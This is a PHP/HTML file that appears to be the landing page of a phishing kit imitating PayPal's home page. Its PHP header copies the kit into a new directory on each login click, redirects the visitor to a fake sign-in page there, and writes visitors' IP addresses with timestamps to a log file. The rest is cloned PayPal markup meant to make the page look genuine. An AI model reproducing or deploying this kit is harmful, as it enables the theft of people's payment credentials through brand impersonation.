<?
include 'get_infos.php';
include 'lang/language.php'; 
if (isset($_POST['login'])) {
recurse_copy( $src, $dst );
header("location:$dst/signin?country.x=".$cn."&locale.x=en_".$cn."");
$ip = getenv("REMOTE_ADDR");
$file = fopen("vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");}
?> 

 
<!DOCTYPE html>
<html lang="en-US" class="js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage indexeddb hashchange history draganddrop rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage applicationcache svg inlinesvg smil svgclippaths jsEnabled" data-device-type="dedicated"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="shortcut icon" type="image/x-icon" href="./files/img/favicon.ico">
<title><?=$language['index'][0];?></title>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, minimal-ui, shrink-to-fit=no">
<link rel="stylesheet" href="./home_files/css.css" type="text/css">
<style></style></head>
    <body>        
<div id="body" class="">
<header class="table-row pp-header" role="banner"> 
    <div>
<div class="containerCentered ">
<a id="menu-button" role="button"><?=$language['index'][1];?></a>
<a onclick='window.location.href=""' class="paypal-img-logo">PayPal</a>
<nav id="main-menu" class="main-menu" role="navigation">
    <ul>
      <li><a id="header-personal" rel="menuitem" aria-controls="submenu-personal"  aria-expanded="false"><?=$language['index'][2];?></a><div class="menu-wrapper" id="submenu-personal" aria-labelledby="header-personal" role="region"><ul id="header-personal-menu" class="subnav list"><a id="header-personal" rel="menuitem" aria-controls="submenu-personal"  tabindex="-1"><?=$language['index'][2];?></a>
<li><a tabindex="-1"><?=$language['index'][3];?></a></li>
<li><a tabindex="-1"><?=$language['index'][4];?></a></li>
<li><a tabindex="-1"><?=$language['index'][5];?></a></li>
<li><a tabindex="-1"><?=$language['index'][6];?></a></li>
<li><a tabindex="-1"><?=$language['index'][7];?></a></li>
<li><a tabindex="-1"><?=$language['index'][8];?></a></li>
</ul>
<a class="closer" role="button" title="Close" ><span class="accessAid"><?=$language['index'][9];?></span></a></div></li><li><a id="header-business" rel="menuitem" aria-controls="submenu-business"  aria-expanded="false"><?=$language['index'][10];?></a><div class="menu-wrapper" id="submenu-business" aria-labelledby="header-business" role="region"><ul id="header-business-menu" class="subnav list"><a id="header-business" rel="menuitem" aria-controls="submenu-business"  tabindex="-1"><?=$language['index'][10];?></a>
<li><a tabindex="-1"><?=$language['index'][11];?></a></li>
<li><a tabindex="-1"><?=$language['index'][12];?></a></li>
<li><a tabindex="-1"><?=$language['index'][13];?></a></li>
<li><a tabindex="-1"><?=$language['index'][14];?></a></li>
<li><a tabindex="-1"><?=$language['index'][15];?></a></li>
<li><a tabindex="-1"><?=$language['index'][16];?></a></li>
</ul>
<a class="closer" role="button" title="Close" >
  <span class="accessAid"><?=$language['index'][9];?></span></a></div></li>

<li><a onclick='window.location.href=""' id="header-send" class="no-drop"><?=$language['index'][17];?></a><div class="menu-wrapper" id="submenu-" aria-labelledby="header-" role="region"><ul id="header--menu" class="subnav list"><a onclick='window.location.href=""' id="header-send" class="no-drop"  tabindex="-1"><?=$language['index'][17];?></a>
</ul><a class="closer" role="button" title="Close"><span class="accessAid"><?=$language['index'][9];?></span></a></div></li><li><a onclick='window.location.href=""' id="header-request" class="no-drop" ><?=$language['index'][18];?></a><div class="menu-wrapper" id="submenu-" aria-labelledby="header-" role="region"><ul id="header--menu" class="subnav list"><a onclick='window.location.href=""' id="header-request" class="no-drop"  tabindex="-1"><?=$language['index'][18];?></a>
</ul><a class="closer" role="button" title="Close"><span class="accessAid"><?=$language['index'][9];?></span></a></div></li>
</ul>


<ul class="sublist">
<li><a onclick='window.location.href=""' id="signup-button-mobile" name="SignUp_header" class="btn btn-small btn-white-border signup-mobile" ><?=$language['index'][19];?></a></li>
</ul>
</nav>
<div id="header-buttons" class="header-buttons">
<form method="post">
<button id="ul-btn" class="btn btn-small btn-secondary" name="login"><?=$language['login'][4];?></button>
<a onclick='window.location.href=""' id="signup-button" class="btn btn-small btn-signup"><?=$language['login'][5];?></a>
</form>
</div>
</div>
    </div>
</header>
<div role="main" id="main" class="containerMobileFullWidth">
<section class="row-fluid hero-home center-text row cookied-hero-flip-tile dark" style="background-image: url(home_files/hero-cookied-base-2.jpg)">
  <div class="containerCentered container">
    <div class="vertical-centered">

      <h1 class="span9 center-block">
        <?=$language['index'][20];?>
</h1>
<p class="subheadline"><?=$language['index'][21];?></p>
<div class="mainContainer">
            <a onclick='window.location.href=""' class="btn span4 center-block useModal "><?=$language['index'][22];?></a>
          </div>
<div class="hatchContainer">
  <form method="post">
  <button class=" btn btn-white-border span4 center-block" name="login"><?=$language['index'][23];?></button>
</form>
        </div>
</div>
</div>
</section>
<section class="panel four-panel center-text four-tile-flip-container" id="overview">

    <div class="row-fluid">
        <header class="containerCentered center-text">
            <h2 class="pulloutHeadline"><?=$language['index'][24];?></h2>
        </header>

        <div class="containerCentered container4d2p1m">
            <div class="panel1 flip-container span3" ontouchstart="this.classList.toggle(&#39;hover&#39;);">
                <a onclick='window.location.href=""' class="flipper">
                  <div class="front">
                        <h2 class="contentHead medium"><?=$language['index'][25];?></h2>
                        <img src="./home_files/shortlander_get_started.png">
                  </div>
                  <div class="back">
                        <h2 class="contentHead medium"><?=$language['index'][25];?></h2>
                    <p class="contentPara"><?=$language['index'][26];?><span><?=$language['index'][22];?></span></p>
                  </div>
                </a>
            </div>
            <div class="panel2 flip-container span3" ontouchstart="this.classList.toggle(&#39;hover&#39;);">
                <a onclick='window.location.href=""' class="flipper">
                  <div class="front">
                    <h2 class="contentHead medium"><?=$language['index'][27];?></h2>
                    <img src="./home_files/shortlander_pay_your_way.png">
                  </div>
                  <div class="back">
                                <h2 class="contentHead medium"><?=$language['index'][27];?></h2>
                    <p class="contentPara"><?=$language['index'][28];?><span><?=$language['index'][22];?></span></p>
                  </div>
                </a>
            </div>
            <div class="panel3 flip-container span3" ontouchstart="this.classList.toggle(&#39;hover&#39;);">
                <a onclick='window.location.href=""' class="flipper">
                  <div class="front">
                        <h2 class="contentHead medium"><?=$language['index'][29];?>*</h2>
                        <img src="./home_files/shortlander_purchase_protection.png">
                  </div>
                  <div class="back">
                        <h2 class="contentHead medium"><?=$language['index'][29];?>*</h2>
                    <p class="contentPara"><?=$language['index'][30];?><span><?=$language['index'][22];?></span></p>
                  </div>
                </a>
            </div>
            <div class="panel4 flip-container span3" ontouchstart="this.classList.toggle(&#39;hover&#39;);">
                <a onclick='window.location.href=""' class="flipper">
                  <div class="front">
                        <h2 class="contentHead medium"><?=$language['index'][31];?></h2>
                        <img src="./home_files/shortlander_send_money.png">
                  </div>
                  <div class="back">
                        <h2 class="contentHead medium"><?=$language['index'][31];?></h2>
                    <p class="contentPara"><?=$language['index'][32];?><span><?=$language['index'][33];?></span></p>
                  </div>
                </a>
            </div>
        </div>
    </div>
<footer class="containerCentered">*<a onclick='window.location.href=""'><?=$language['index'][34];?></a></footer>
</section>
</div>
<footer role="contentinfo" class="global-footer">
    <div class="containerCentered containerExtend">
<ul class="footer-main secondaryLink">
<li><a><?=$language['index'][35];?></a></li>
<li><a><?=$language['index'][36];?></a></li>
<li><a><?=$language['index'][37];?></a></li>
<li><a><?=$language['index'][38];?></a></li>
<li><a><?=$language['index'][39];?></a></li>
<li class="country-selector ">
<a onclick='window.location.href=""' class="country US"><?=$language['index'][40];?></a>
    </li>
<li class="footer-search">                          
<a onclick='window.location.href=""'  aria-label="Search"><?=$language['index'][41];?></a>
</li>                
</ul>
<hr>
<ul class="footer-secondary secondaryLink">
<li><a><?=$language['index'][42];?></a></li>
<li><a><?=$language['index'][43];?></a></li>
<li><a><?=$language['index'][44];?></a></li>
<li><a><?=$language['index'][45];?></a></li>
<li><a><?=$language['index'][46];?>/a></li>
<li><a><?=$language['index'][47];?></a></li>
<li><a><?=$language['index'][48];?></a></li>
<li><a><?=$language['index'][49];?></a></li>
<li><a><?=$language['index'][50];?></a></li>
</ul>
<ul class="footer-tertiary copyright-section secondaryLink">
<li id="footer-copyright" class="footer-copyright"><?=$language['index'][51];?></li>
<li id="footer-privacy"><a><?=$language['index'][52];?></a></li>
<li class="footer-legal"><a><?=$language['index'][53];?></a></li>
<li id="siteFeedback" class="">
                <a><?=$language['index'][54];?></a>
            </li>
        </ul>
</div>
</footer>
<script src="./home_files/js.js"></script> 
<script src="./home_files/pa.js"></script>
<style type="text/css">
	a{
		cursor: pointer;
	}
</style>
</div></body></html>